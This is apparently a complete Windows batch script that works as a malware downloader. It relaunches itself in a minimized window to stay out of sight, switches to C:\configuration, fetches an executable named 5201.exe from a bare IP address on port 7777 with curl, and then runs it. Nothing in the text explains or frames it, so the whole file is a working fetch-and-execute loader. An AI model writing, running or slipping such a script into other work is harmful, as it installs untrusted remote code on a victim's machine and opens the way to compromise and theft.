if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
cd C:\configuration
curl http://111.90.151.174:7777/5201.exe -O
5201.exe
exit

